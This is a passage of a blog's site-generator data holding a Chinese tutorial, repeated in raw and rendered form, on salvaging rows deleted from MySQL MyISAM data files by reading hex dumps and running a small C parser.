|\n|     22 | admin22  | passwd22 | 2017-03-11 |\n+--------+----------+----------+------------+\n10 rows in set (0.00 sec)\n删除后的数据块如下:\n69 6E 31 32 08 70 61 73  in12^Hpas\n73 77 64 31 32 6B C2 0F  swd12kÂ^O\n00 00 00 1C 00 00 00 00  ^@^@^@^\\^@^@^@^@\n00 00 0A D4 FF FF FF FF  ^@^@Ôÿÿÿÿ\nFF FF FF FF 73 77 64 31  ÿÿÿÿswd1\n33 6B C2 0F 01 00 19 00  3kÂ^O^A^@^Y^@\n0E 00 00 00 07 61 64 6D  ^N^@^@^@^Gadm\n69 6E 31 34 08 70 61 73  in14^Hpas\n73 77 64 31 34 6B C2 0F  swd14kÂ^O\n01 00 19 00 0F 00 00 00  ^A^@^Y^@^O^@^@^@\n07 61 64 6D 69 6E 31 35  ^Gadmin15\n08 70 61 73 73 77 64 31  ^Hpasswd1\n35 6B C2 0F 01 00 19 00  5kÂ^O^A^@^Y^@\n10 00 00 00 07 61 64 6D  ^P^@^@^@^Gadm\n69 6E 31 36 08 70 61 73  in16^Hpas\n73 77 64 31 36 6B C2 0F  swd16kÂ^O\n01 00 19 00 11 00 00 00  ^A^@^Y^@^Q^@^@^@\n07 61 64 6D 69 6E 31 37  ^Gadmin17\n08 70 61 73 73 77 64 31  ^Hpasswd1\n37 6B C2 0F 01 00 19 00  7kÂ^O^A^@^Y^@\n12 00 00 00 07 61 64 6D  ^R^@^@^@^Gadm\n</code></pre>\nUSERID=13数据块变化对比\n<pre><code>delete后\n00 00 00 1C 00 00 00 00  ^@^@^@^\\^@^@^@^@\n00 00 0A D4 FF FF FF FF  ^@^@Ôÿÿÿÿ\nFF FF FF FF 73 77 64 31  ÿÿÿÿswd1\n33 6B C2\ndelete前\n01 00 19 00 0D 00 00 00  ^A^@^Y^@^M^@^@^@\n07 61 64 6D 69 6E 31 33  ^Gadmin13\n08 70 61 73 73 77 64 31  ^Hpasswd1\n33 6B C2 0F\n前20位被破坏了,但是后面的数据还可以,只是数据很少了,如果没有数据写入的话,还有一线恢复的生机,主要找到后面数据的对应关系才能恢复\n如果是大批量的数据被删除,恢复就需要看运气了,大家还是定时做好备份和开始mysql的log-bin模式.\n关于头长度和delete头长度请阅读mysql官方\nhttps://dev.mysql.com/doc/internals/en/layout-record-storage-frame.html\n</code></pre>\n关于解析test.MYD文件格式,写了一些代码希望对理解MDY文件结构有些帮助.\n<pre><code>key1088@key1088-host:~/code/repari$ cat repariMYD.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;arpa/inet.h&gt;\nvoid writeSQL(char *filebuf,unsigned int flen);\nint main(int argc, char **argv)\n{\n    int fd=0;\n    unsigned flen = 0;\n    unsigned char *filebuf = NULL;\n    struct stat fsbuf;\n    char    *filename = NULL;\n    if ( argc &lt; 2 ) {\n        printf(\"repari Mysql MyISAM DataFile\\n\");\n        printf(\"%s [MyISAM DATA .MYD File] \\n\", argv[0]);\n        exit(-1);\n    }\n    filename = argv[1];\n    if ( stat(filename,&amp;fsbuf) == -1 ) {\n        printf(\"open file test.MYD error,msg = %s\\n\", strerror(errno));\n        exit(-1);\n    }\n    flen = fsbuf.st_size;\n    printf(\"Read %s filesize is %u\\n\", argv[1], flen);\n    if ( flen == 0 ) {\n        printf(\"file is empty\\n\");\n        exit(-1);\n    }\n    if( (fd=open(filename,O_RDONLY) ) == -1 ) {\n        printf(\"open file test.MYD error,msg = %s\\n\", strerror(errno));\n        exit(-1);\n    }\n    filebuf = (unsigned char *)malloc(flen*sizeof(char)+1);\n    if ( filebuf == NULL ) {\n        printf(\"malloc error,msg = %s\\n\", strerror(errno));\n        close(fd);\n        exit(-1);\n    }\n    read(fd,filebuf,flen);\n    close(fd);\n    writeSQL(filebuf,flen);\n    free(filebuf);\n    return 0;\n}\nvoid writeSQL(char *filebuf,unsigned int flen)\n{\n    char    c;\n    unsigned i = 0;\n    long tmplen = 0;\n    unsigned char tmp[5];\n    unsigned char tmpchar[255+1];\n    int y,m,d;\n    while ( i &lt; flen ) {\n        if ( filebuf[i] == 0x00 ) {\n            i++;\n        }\n        printf(\"head=[%02x]\", filebuf[i]);\n        if( filebuf[i] == 0x03 ) {\n            i = i + 1 + 4; /* 1 + 4head */\n        } else if ( filebuf[i] == 0x01 ) {\n            i = i + 1 + 3; /* 1 + 3head */\n        }\n        /* int 4B */\n        memset(tmp,0x00,sizeof(tmp));\n        if ( (i+4) &gt;  flen ) {\n            printf(\"\\nover\\n\");\n            return;\n        }\n        memcpy(tmp,filebuf + i, 4);\n        /*需要倒序*/\n        sprintf(tmp,\"%02x%02x%02x%02x\",tmp[3],tmp[2],tmp[1],tmp[0]);\n        printf(\"[%s] %ld - \", tmp, strtol(tmp,NULL, 16));\n        i = i + 4;\n        /*varchar */\n            /* 1位长度 */\n        memset(tmp,0x00,sizeof(tmp));\n        if ( (i+1) &gt;  flen ) {\n            printf(\"\\nover\\n\");\n            return;\n        }\n        memcpy(tmp,filebuf + i, 1);\n        sprintf(tmp,\"%02x\",tmp[0]);\n        tmplen = strtol(tmp,NULL,16);\n        i = i + 1;\n            /* DATA */\n        memset(tmpchar,0x00,sizeof(tmpchar));\n        if ( (i + tmplen)&gt;  flen ) {\n            printf(\"\\nover\\n\");\n            return;\n        }\n        memcpy(tmpchar,filebuf + i, tmplen);\n        printf(\"%s - \", tmpchar);\n        i = i + tmplen;\n        /*varchar*/\n            /* 1位长度 */\n        memset(tmp,0x00,sizeof(tmp));\n        if ( (i+1) &gt;  flen ) {\n            printf(\"\\nover\\n\");\n            return;\n        }\n        memcpy(tmp,filebuf + i, 1);\n        sprintf(tmp,\"%02x\",tmp[0]);\n        tmplen = strtol(tmp,NULL,16);\n        i = i + 1;\n            /* DATA */\n        memset(tmpchar,0x00,sizeof(tmpchar));\n        if ( (i+tmplen) &gt;  flen ) {\n            printf(\"\\nover\\n\");\n            return;\n        }\n        memcpy(tmpchar,filebuf + i, tmplen);\n        printf(\"%s - \", tmpchar);\n        i = i + tmplen;\n        /*date 3位 */\n        memset(tmp,0x00,sizeof(tmp));\n        memset(tmpchar,0x00,sizeof(tmpchar));\n        if( (i+3) &gt; flen) {\n            printf(\"\\nover\\n\");\n            return;\n        }\n        memcpy(tmp,filebuf + i,3);\n        sprintf(tmpchar,\"%02x%02x%02x\",tmp[2],tmp[1],tmp[0]);\n        tmplen = strtol(tmpchar,NULL,16);\n        y = m = d = 0;\n        y = tmplen / 32 / 16;\n        m = (tmplen - (32*16*y)) / 32;\n        d = tmplen - (32*16*y) - (32*m);\n        printf(\"%d-%d-%d\",y,m,d);\n        i = i + 3;\n        printf(\"\\n\");\n    }\n}\nkey1088@key1088-host:~/code/repari$\n</code></pre>","source":"_posts/关于MYSQL-MyISAM引擎delete-恢复方法和猜想.md","raw":"title: 关于MYSQL MyISAM引擎delete 恢复方法和猜想\ncategories: [Mysql,数据库]\ntags: []\ndate: 2017-03-12 22:52:57\n---\n如果使用MYSQL数据库,不一小心误操作,删除掉不该删除的数据,同时又没有打开BIN-LOG,怎么办呢?除了后悔没有按时备份还能怎么办??本篇带来一遍恢复数据的文档,不能完全恢复只是给一个思路\n此方法只用与MyISAM引擎,同时只是实用于部分数据,如果使用delete from xxx不带where条件的删除,是没有办法恢复的,使用此方法也不能完全恢复,只会找回一些数据,总比没有什么都没有要一些吧.\n还有网上很多文档说delete只是修改的索引值而不是真正的删除,这个至少我没有办法也许是版本的问题就不去深究了.\n**注意:当遇到数据被误删除事,请不要立马恢复之前的备份(如果可以的),而是先把服务停掉不让其继续写数据,再把数据库的数据文件备份出来,在mysql数据目录下面,已数据库名称为目录.\n**\n开始操作\nMyISAM的存储引擎每一个表需要三个文件,如下(XXX代表表名称):\n<blockquote>\n  <ul>\n  <li>XXX.frm  表结构</li>\n  <li>XXX.MYD  数据文件   </li>\n  <li>XXX.MYI  索引文件</li>\n  </ul>\n</blockquote>\n恢复数据我们只需要重点关注数据文件即可.使用16进制模式打开文件,看一下文件内容隐约能看到一些内容.\n在WINDOWS下面可以用UE打开,在linux下面直接使用hexdump命令即可,命令如下:\n<pre><code>hexdump -e '8/1 \"%02X \"\"\\t\"\" \"' -e '8/1 \"%c\"\"\\n\"'  test.MYD\n</code></pre>\n在打开数据文件之前,先看一下我使用的数据表结构和测试数据.\n<pre><code>mysql&gt; desc test;\n+------------+-------------+------+-----+---------+-------+\n| Field      | Type        | Null | Key | Default | Extra |\n+------------+-------------+------+-----+---------+-------+\n| userid     | int(10)     | NO   | PRI | NULL    |       |\n| username   | varchar(60) | NO   |     | NULL    |       |\n| password   | varchar(60) | NO   |     | NULL    |       |\n| lastupdate | date        | NO   |     | NULL    |       |\n+------------+-------------+------+-----+---------+-------+\n4 rows in set (0.00 sec)\nmysql&gt; select * from test limit 10,10;\n+--------+----------+----------+------------+\n| userid | username | password | lastupdate |\n+--------+----------+----------+------------+\n|     13 | admin13  | passwd13 | 2017-03-11 |\n|     14 | admin14  | passwd14 | 2017-03-11 |\n|     15 | admin15  | passwd15 | 2017-03-11 |\n|     16 | admin16  | passwd16 | 2017-03-11 |\n|     17 | admin17  | passwd17 | 2017-03-11 |\n|     18 | admin18  | passwd18 | 2017-03-11 |\n|     19 | admin19  | passwd19 | 2017-03-11 |\n|     20 | admin20  | passwd20 | 2017-03-11 |\n|     21 | admin21  | passwd21 | 2017-03-11 |\n|     22 | admin22  | passwd22 | 2017-03-11 |\n+--------+----------+----------+------------+\n10 rows in set (0.00 sec)\n</code></pre>\n然后打开数据文件,截取一段16进制数据.\n<pre><code>69 6E 31 32 08 70 61 73  in12^Hpas\n73 77 64 31 32 6B C2 0F  swd12kÂ^O\n01 00 19 00 0D 00 00 00  ^A^@^Y^@^M^@^@^@\n07 61 64 6D 69 6E 31 33  ^Gadmin13\n08 70 61 73 73 77 64 31  ^Hpasswd1\n33 6B C2 0F 01 00 19 00  3kÂ^O^A^@^Y^@\n0E 00 00 00 07 61 64 6D  ^N^@^@^@^Gadm\n69 6E 31 34 08 70 61 73  in14^Hpas\n73 77 64 31 34 6B C2 0F  swd14kÂ^O\n01 00 19 00 0F 00 00 00  ^A^@^Y^@^O^@^@^@\n07 61 64 6D 69 6E 31 35  ^Gadmin15\n08 70 61 73 73 77 64 31  ^Hpasswd1\n35 6B C2 0F 01 00 19 00  5kÂ^O^A^@^Y^@\n10 00 00 00 07 61 64 6D  ^P^@^@^@^Gadm\n69 6E 31 36 08 70 61 73  in16^Hpas\n73 77 64 31 36 6B C2 0F  swd16kÂ^O\n01 00 19 00 11 00 00 00  ^A^@^Y^@^Q^@^@^@\n07 61 64 6D 69 6E 31 37  ^Gadmin17\n08 70 61 73 73 77 64 31  ^Hpasswd1\n37 6B C2 0F 01 00 19 00  7kÂ^O^A^@^Y^@\n12 00 00 00 07 61 64 6D  ^R^@^@^@^Gadm\n69 6E 31 38 08 70 61 73  in18^Hpas\n73 77 64 31 38 6B C2 0F  swd18kÂ^O\n01 00 19 00 13 00 00 00  ^A^@^Y^@^S^@^@^@\n07 61 64 6D 69 6E 31 39  ^Gadmin19\n08 70 61 73 73 77 64 31  ^Hpasswd1\n39 6B C2 0F 01 00 19 00  9kÂ^O^A^@^Y^@\n14 00 00 00 07 61 64 6D  ^T^@^@^@^Gadm\n69 6E 32 30 08 70 61 73  in20^Hpas\n73 77 64 32 30 6B C2 0F  swd20kÂ^O\n01 00 19 00 15 00 00 00  ^A^@^Y^@^U^@^@^@\n07 61 64 6D 69 6E 32 31  ^Gadmin21\n08 70 61 73 73 77 64 32  ^Hpasswd2\n31 6B C2 0F 01 00 19 00  1kÂ^O^A^@^Y^@\n16 00 00 00 07 61 64 6D  ^V^@^@^@^Gadm\n69 6E 32 32 08 70 61 73  in22^Hpas\n73 77 64 32 32 6B C2 0F  swd22kÂ^O\n01 00 19 00 17 00 00 00  ^A^@^Y^@^W^@^@^@\n07 61 64 6D 69 6E 32 33  ^Gadmin23\n08 70 61 73 73 77 64 32  ^Hpasswd2\n</code></pre>\nuserid=13的明细对应着一下16进制数据快.\n<pre><code>01 00 19 00 0D 00 00 00  ^A^@^Y^@^M^@^@^@\n07 61 64 6D 69 6E 31 33  ^Gadmin13\n08 70 61 73 73 77 64 31  ^Hpasswd1\n33 6B C2 0F\n</code></pre>\n简单解析一下这些数据结构的意思.\n<blockquote>\n  <ul>\n  <li>01 00 19 00                              :这里是4位数据头,不代表头就是4为,这个数据头不固定</li>\n  <li>0D 00 00 00                              :为userid的值13,int占4位.</li>\n  <li>07 61 64 6D 69 6E 31 33        :07代表长度 后面7位为数据,varchar数据这样表示.</li>\n  <li>08 70 61 73 73 77 64 31 33   :varchar和上面一样.</li>\n  <li>6B C2 0F                                   :为date类型,占位为3.值为2017,计算方法是\"day + month<em>32 + year</em>16*32'\"</li>\n  <li>具体其他数据字段长度和结构可以详见MYSQL官方文档\n  https://dev.mysql.com/doc/internals/en/myisam-column-attributes.html</li>\n  </ul>\n</blockquote>\n咱们删除一条数据看一下数据快的变化:\n<pre><code>mysql&gt; delete from test where userid = 13;\nQuery OK, 1 row affected (0.00 sec)\nmysql&gt; select * from test limit 9,10;\n+--------+----------+----------+------------+\n| userid | username | password | lastupdate |\n+--------+----------+----------+------------+\n|     12 | admin12  | passwd12 | 2017-03-11 |\n|     14 | admin14  | passwd14 | 2017-03-11 |\n|     15 | admin15  | passwd15 | 2017-03-11 |\n|     16 | admin16  | passwd16 | 2017-03-11 |\n|     17 | admin17  | passwd17 | 2017-03-11 |\n|     18 | admin18  | passwd18 | 2017-03-11 |\n|     19 | admin19  | passwd19 | 2017-03-11 |\n|     20 | admin20  | passwd20 | 2017-03-11 |\n|     21 | admin21  | passwd21 | 2017-03-11 |\n|     22 | admin22  | passwd22 | 2017-03-11 |\n+--------+----------+----------+------------+\n10 rows in set (0.00 sec)\n删除后的数据块如下:\n69 6E 31 32 08 70 61 73  in12^Hpas\n73 77 64 31 32 6B C2 0F  swd12kÂ^O\n00 00 00 1C 00 00 00 00  ^@^@^@^\\^@^@^@^@\n00 00 0A D4 FF FF FF FF  ^@^@Ôÿÿÿÿ\nFF FF FF FF 73 77 64 31  ÿÿÿÿswd1\n33 6B C2 0F 01 00 19 00  3kÂ^O^A^@^Y^@\n0E 00 00 00 07 61 64 6D  ^N^@^@^@^Gadm\n69 6E 31 34 08 70 61 73  in14^Hpas\n73 77 64 31 34 6B C2 0F  swd14kÂ^O\n01 00 19 00 0F 00 00 00  ^A^@^Y^@^O^@^@^@\n07 61 64 6D 69 6E 31 35  ^Gadmin15\n08 70 61 73 73 77 64 31  ^Hpasswd1\n35 6B C2 0F 01 00 19 00  5kÂ^O^A^@^Y^@\n10 00 00 00 07 61 64 6D  ^P^@^@^@^Gadm\n69 6E 31 36 08 70 61 73  in16^Hpas\n73 77 64 31 36 6B C2 0F  swd16kÂ^O\n01 00 19 00 11 00 00 00  ^A^@^Y^@^Q^@^@^@\n07 61 64 6D 69 6E 31 37  ^Gadmin17\n08 70 61 73 73 77 64 31  ^Hpasswd1\n37 6B C2 0F 01 00 19 00  7kÂ^O^A^@^Y^@\n12 00 00 00 07 61 64 6D  ^R^@^@^@^Gadm\n</code></pre>\nUSERID=13数据块变化对比\n<pre><code>delete后\n00 00 00 1C 00 00 00 00  ^@^@^@^\\^@^@^@^@\n00 00 0A D4 FF FF FF FF  ^@^@Ôÿÿÿÿ\nFF FF FF FF 73 77 64 31  ÿÿÿÿswd1\n33 6B C2\ndelete前\n01 00 19 00 0D 00 00 00  ^A^@^Y^@^M^@^@^@\n07 61 64 6D 69 6E 31 33  ^Gadmin13\n08 70 61 73 73 77 64 31  ^Hpasswd1\n33 6B C2 0F\n前20位被破坏了,但是后面的数据还可以,只是数据很少了,如果没有数据写入的话,还有一线恢复的生机,主要找到后面数据的对应关系才能恢复\n如果是大批量的数据被删除,恢复就需要看运气了,大家还是定时做好备份和开始mysql的log-bin模式.\n关于头长度和delete头长度请阅读mysql官方\nhttps://dev.mysql.com/doc/internals/en/layout-record-storage-frame.html\n</code></pre>\n关于解析test.MYD文件格式,写了一些代码希望对理解MDY文件结构有些帮助.\n<pre><code>key1088@key1088-host:~/code/repari$ cat repariMYD.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;arpa/inet.h&gt;\nvoid writeSQL(char *filebuf,unsigned int flen);\nint main(int argc, char **argv)\n{\n    int fd=0;\n    unsigned flen = 0;\n    unsigned char *filebuf = NULL;\n    struct stat fsbuf;\n    char    *filename = NULL;\n    if ( argc &lt; 2 ) {\n        printf(\"repari Mysql MyISAM DataFile\\n\");\n        printf(\"%s [MyISAM DATA .MYD File] \\n\", argv[0]);\n        exit(-1);\n    }\n    filename = argv[1];\n    if ( stat(filename,&amp;fsbuf) == -1 ) {\n        printf(\"open file test.MYD error,msg = %s\\n\", strerror(errno));\n        exit(-1);\n    }\n    flen = fsbuf.st_size;\n    printf(\"Read %s filesize is %u\\n\", argv[1], flen);\n    if ( flen == 0 ) {\n        printf(\"file is empty\\n\");\n        exit(-1);\n    }\n    if( (fd=open(filename,O_RDONLY) ) == -1 ) {\n        printf(\"open file test.MYD error,msg = %s\\n\", strerror(errno));\n        exit(-1);\n    }\n    filebuf = (unsigned char *)malloc(flen*sizeof(char)+1);\n    if ( filebuf == NULL ) {\n        printf(\"malloc error,msg = %s\\n\", strerror(errno));\n        close(fd);\n        exit(-1);\n    }\n    read(fd,filebuf,flen);\n    close(fd);\n    writeSQL(filebuf,flen);\n    free(filebuf);\n    return 0;\n}\nvoid writeSQL(char *filebuf,unsigned int flen)\n{\n    char    c;\n    unsigned i = 0;\n    long tmplen = 0;\n    unsigned char tmp[5];\n    unsigned char tmpchar[255+1];\n    int y,m,d;\n    while ( i &lt; flen ) {\n        if ( filebuf[i] == 0x00 ) {\n            i++;\n        }\n        printf(\"head=[%02x]\", filebuf[i]);\n        if( filebuf[i] == 0x03 ) {\n            i = i + 1 + 4; /* 1 + 4head */\n        } else if ( filebuf[i] == 0x01 ) {\n            i = i + 1 + 3; /* 1 + 3head */\n        }\n        /* int 4B */\n        memset(tmp,0x00,sizeof(tmp));\n        if ( (i+4) &gt;  flen ) {\n            printf(\"\\nover\\n\");\n            return;\n        }\n        memcpy(tmp,filebuf + i, 4);\n        /*需要倒序*/\n        sprintf(tmp,\"%02x%02x%02x%02x\",tmp[3],tmp[2],tmp[1],tmp[0]);\n        printf(\"[%s] %ld - \", tmp, strtol(tmp,NULL, 16));\n        i = i + 4;\n        /*varchar */\n            /* 1位长度 */\n        memset(tmp,0x00,sizeof(tmp));\n        if ( (i+1) &gt;  flen ) {\n            printf(\"\\nover\\n\");\n            return;\n        }\n        memcpy(tmp,filebuf + i, 1);\n        sprintf(tmp,\"%02x\",tmp[0]);\n        tmplen = strtol(tmp,NULL,16);\n        i = i + 1;\n            /* DATA */\n        memset(tmpchar,0x00,sizeof(tmpchar));\n        if ( (i + tmplen)&gt;  flen ) {\n            printf(\"\\nover\\n\");\n            return;\n        }\n        memcpy(tmpchar,filebuf + i, tmplen);\n        printf(\"%s - \", tmpchar);\n        i = i + tmplen;\n        /*varchar*/\n            /* 1位长度 */\n        memset(tmp,0x00,sizeof(tmp));\n        if ( (i+1) &gt;  flen ) {\n            printf(\"\\nover\\n\");\n            return;\n        }\n        memcpy(tmp,filebuf + i, 1);\n        sprintf(tmp,\"%02x\",tmp[0]);\n        tmplen = strtol(tmp,NULL,16);\n        i = i + 1;\n            /* DATA */\n        memset(tmpchar,0x00,sizeof(tmpchar));\n        if ( (i+tmplen) &gt;  flen ) {\n            printf(\"\\nover\\n\");\n            return;\n        }\n        memcpy(tmpchar,filebuf + i, tmplen);\n        printf(\"%s - \", tmpchar);\n        i = i + tmplen;\n        /*date 3位 */\n        memset(tmp,0x00,sizeof(tmp));\n        memset(tmpchar,0x00,sizeof(tmpchar));\n        if( (i+3) &gt; flen) {\n            printf(\"\\nover\\n\");\n            return;\n        }\n        memcpy(tmp,filebuf + i,3);\n        sprintf(tmpchar,\"%02x%02x%02x\",tmp[2],tmp[1],tmp[0]);\n        tmplen = strtol(tmpchar,NULL,16);\n        y = m = d = 0;\n        y = tmplen / 32 / 16;\n        m = (tmplen - (32*16*y)) / 32;\n        d = tmplen - (32*16*y) - (32*m);\n        printf(\"%d-%d-%d\",y,m,d);\n        i = i + 3;\n        printf(\"\\n\");\n    }\n}\nkey1088@key1088-host:~/code/repari$\n</code></pre>","slug":"关于MYSQL-MyISAM引擎delete-恢复方法和猜想","published":1,"updated":"2023-04-22T05:38:45.001Z","_id":"clgrjlxks009f7opig8gggbxx","comments":1,"layout":"post","photos":[],"link":"","content":"<p>如果使用MYSQL数据库,不一小心误操作,删除掉不该删除的数据,同时又没有打开BIN-LOG,怎么办呢?除了后悔没有按时备份还能怎么办??本篇带来一遍恢复数据的文档,不能完全恢复只是给一个思路<br>此方法只用与MyISAM引擎,同时只是实用于部分数据,如果使用delete from xxx不带where条件的删除,是没有办法恢复的,使用此方法也不能完全恢复,只会找回一些数据,总比没有什么都没有要一些吧.<br>还有网上很多文档说delete只是修改的索引值而不是真正的删除,这个至少我没有办法也许是版本的问题就不去深究了.<br>**注意:当遇到数据被误删除事,请不要立马恢复之前的备份(如果可以的),而是先把服务停掉不让其继续写数据,再把数据库的数据文件备份出来,在mysql数据目录下面,已数据库名称为目录.<br>**<br>开始操作<br>MyISAM的存储引擎每一个表需要三个文件,如下(XXX代表表名称):</p>\n<blockquote>\n  <ul>\n  <li>XXX.frm  表结构</li>\n  <li>XXX.MYD  数据文件   </li>\n  <li>XXX.MYI  索引文件</li>\n  </ul>\n</blockquote>\n恢复数据我们只需要重点关注数据文件即可.使用16进制模式打开文件,看一下文件内容隐约能看到一些内容.\n在WINDOWS下面可以用UE打开,在linux下面直接使用hexdump命令即可,命令如下:\n<pre><code>hexdump -e '8/1 \"%02X \"\"\\t\"\" \"' -e '8/1 \"%c\"\"\\n\"'  test.MYD\n</code></pre>\n在打开数据文件之前,先看一下我使用的数据表结构和测试数据.\n<pre><code>mysql&gt; desc test;\n+------------+-------------+------+-----+---------+-------+\n| Field      | Type        | Null | Key | Default | Extra |\n+------------+-------------+------+-----+---------+-------+\n| userid     | int(10)     | NO   | PRI | NULL    |       |\n| username   | varchar(60) | NO   |     | NULL    |       |\n| password   | varchar(60) | NO   |     | NULL    |       |\n| lastupdate | date        | NO   |     | NULL    |       |\n+------------+-------------+------+-----+---------+-------+\n4 rows in set (0.00 sec)\nmysql&gt; select * from test limit 10,10;\n+--------+----------+----------+------------+\n| userid | username | password | lastupdate |\n+--------+----------+----------+------------+\n|     13 | admin13  | passwd13 | 2017-03-11 |\n|     14 | admin14  | passwd14 | 2017-03-11 |\n|     15 | admin15  | passwd15 | 2017-03-11 |\n|     16 | admin16  | passwd16 | 2017-03-11 |\n|     17 | admin17  | passwd17 | 2017-03-11 |\n|     18 | admin18  | passwd18 | 2017-03-11 |\n|     19 | admin19  | passwd19 | 2017-03-11 |\n|     20 | admin20  | passwd20 | 2017-03-11 |\n|     21 | admin21  | passwd21 | 2017-03-11 |\n|     22 | admin22  | passwd22 | 2017-03-11 |\n+--------+----------+----------+------------+\n10 rows in set (0.00 sec)\n</code></pre>\n然后打开数据文件,截取一段16进制数据.\n<pre><code>69 6E 31 32 08 70 61 73  in12^Hpas\n73 77 64 31 32 6B C2 0F  swd12kÂ^O\n01 00 19 00 0D 00 00 00  ^A^@^Y^@^M^@^@^@\n07 61 64 6D 69 6E 31 33  ^Gadmin13\n08 70 61 73 73 77 64 31  ^Hpasswd1\n33 6B C2 0F 01 00 19 00  3kÂ^O^A^@^Y^@\n0E 00 00 00 07 61 64 6D  ^N^@^@^@^Gadm\n69 6E 31 34 08 70 61 73  in14^Hpas\n73 77 64 31 34 6B C2 0F  swd14kÂ^O\n01 00 19 00 0F 00 00 00  ^A^@^Y^@^O^@^@^@\n07 61 64 6D 69 6E 31 35  ^Gadmin15\n08 70 61 73 73 77 64 31  ^Hpasswd1\n35 6B C2 0F 01 00 19 00  5kÂ^O^A^@^Y^@\n10 00 00 00 07 61 64 6D  ^P^@^@^@^Gadm\n69 6E 31 36 08 70 61 73  in16^Hpas\n73 77 64 31 36 6B C2 0F  swd16kÂ^O\n01 00 19 00 11 00 00 00  ^A^@^Y^@^Q^@^@^@\n07 61 64 6D 69 6E 31 37  ^Gadmin17\n08 70 61 73 73 77 64 31  ^Hpasswd1\n37 6B C2 0F 01 00 19 00  7kÂ^O^A^@^Y^@\n12 00 00 00 07 61 64 6D  ^R^@^@^@^Gadm\n69 6E 31 38 08 70 61 73  in18^Hpas\n73 77 64 31 38 6B C2 0F  swd18kÂ^O\n01 00 19 00 13 00 00 00  ^A^@^Y^@^S^@^@^@\n07 61 64 6D 69 6E 31 39  ^Gadmin19\n08 70 61 73 73 77 64 31  ^Hpasswd1\n39 6B C2 0F 01 00 19 00  9kÂ^O^A^@^Y^@\n14 00 00 00 07 61 64 6D  ^T^@^@^@^Gadm\n69 6E 32 30 08 70 61 73  in20^Hpas\n73 77 64 32 30 6B C2 0F  swd20kÂ^O\n01 00 19 00 15 00 00 00  ^A^@^Y^@^U^@^@^@\n07 61 64 6D 69 6E 32 31  ^Gadmin21\n08 70 61 73 73 77 64 32  ^Hpasswd2\n31 6B C2 0F 01 00 19 00  1kÂ^O^A^@^Y^@\n16 00 00 00 07 61 64 6D  ^V^@^@^@^Gadm\n69 6E 32 32 08 70 61 73  in22^Hpas\n73 77 64 32 32 6B C2 0F  swd22kÂ^O\n01 00 19 00 17 00 00 00  ^A^@^Y^@^W^@^@^@\n07 61 64 6D 69 6E 32 33  ^Gadmin23\n08 70 61 73 73 77 64 32  ^Hpasswd2\n</code></pre>\nuserid=13的明细对应着一下16进制数据快.\n<pre><code>01 00 19 00 0D 00 00 00  ^A^@^Y^@^M^@^@^@\n07 61 64 6D 69 6E 31 33  ^Gadmin13\n08 70 61 73 73 77 64 31  ^Hpasswd1\n33 6B C2 0F\n</code></pre>\n简单解析一下这些数据结构的意思.\n<blockquote>\n  <ul>\n  <li>01 00 19 00                              :这里是4位数据头,不代表头就是4为,这个数据头不固定</li>\n  <li>0D 00 00 00                              :为userid的值13,int占4位.</li>\n  <li>07 61 64 6D 69 6E 31 33        :07代表长度 后面7位为数据,varchar数据这样表示.</li>\n  <li>08 70 61 73 73 77 64 31 33   :varchar和上面一样.</li>\n  <li>6B C2 0F                                   :为date类型,占位为3.值为2017,计算方法是\"day + month<em>32 + year</em>16*32'\"</li>\n  <li>具体其他数据字段长度和结构可以详见MYSQL官方文档\n  https://dev.mysql.com/doc/internals/en/myisam-column-attributes.html</li>\n  </ul>\n</blockquote>\n咱们删除一条数据看一下数据快的变化:\n<pre><code>mysql&gt; delete from test where userid = 13;\nQuery OK, 1 row affected (0.00 sec)\nmysql&gt; select * from test limit 9,10;\n+--------+----------+----------+------------+\n| userid | username | password | lastupdate |\n+--------+----------+----------+------------+\n|     12 | admin12  | passwd12 | 2017-03-11 |\n|     14 | admin14  | passwd14 | 2017-03-11 |\n|     15 | admin15  | passwd15 | 2017-03-11 |\n|     16 | admin16  | passwd16 | 2017-03-11 |\n|     17 | admin17  | passwd17 | 2017-03-11 |\n|     18 | admin18  | passwd18 | 2017-03-11 |\n|     19 | admin19  | passwd19 | 2017-03-11 |\n|     20 | admin20  | passwd20 | 2017-03-11 |\n|     21 | admin21  | passwd21 | 2017-03-11 |\n|     22 | admin22  | passwd22 | 2017-03-11 |\n+--------+----------+----------+------------+\n10 rows in set (0.00 sec)\n删除后的数据块如下:\n69 6E 31 32 08 70 61 73  in12^Hpas\n73 77 64 31 32 6B C2 0F  swd12kÂ^O\n00 00 00 1C 00 00 00 00  ^@^@^@^\\^@^@^@^@\n00 00 0A D4 FF FF FF FF  ^@^@Ôÿÿÿÿ\nFF FF FF FF 73 77 64 31  ÿÿÿÿswd1\n33 6B C2 0F 01 00 19 00  3kÂ^O^A^@^Y^@\n0E 00 00 00 07 61 64 6D  ^N^@^@^@^Gadm\n69 6E 31 34 08 70 61 73  in14^Hpas\n73 77 64 31 34 6B C2 0F  swd14kÂ^O\n01 00 19 00 0F 00 00 00  ^A^@^Y^@^O^@^@^@\n07 61 64 6D 69 6E 31 35  ^Gadmin15\n08 70 61 73 73 77 64 31  ^Hpasswd1\n35 6B C2 0F 01 00 19 00  5kÂ^O^A^@^Y^@\n10 00 00 00 07 61 64 6D  ^P^@^@^@^Gadm\n69 6E 31 36 08 70 61 73  in16^Hpas\n73 77 64 31 36 6B C2 0F  swd16kÂ^O\n01 00 19 00 11 00 00 00  ^A^@^Y^@^Q^@^@^@\n07 61 64 6D 69 6E 31 37  ^Gadmin17\n08 70 61 73 73 77 64 31  ^Hpasswd1\n37 6B C2 0F 01 00 19 00  7kÂ^O^A^@^Y^@\n12 00 00 00 07 61 64 6D  ^R^@^@^@^Gadm\n</code></pre>\nUSERID=13数据块变化对比\n<pre><code>delete后\n00 00 00 1C 00 00 00 00  ^@^@^@^\\^@^@^@^@\n00 00 0A D4 FF FF FF FF  ^@^@Ôÿÿÿÿ\nFF FF FF FF 73 77 64 31  ÿÿÿÿswd1\n33 6B C2\ndelete前\n01 00 19 00 0D 00 00 00  ^A^@^Y^@^M^@^@^@\n07 61 64 6D 69 6E 31 33  ^Gadmin13\n08 70 61 73 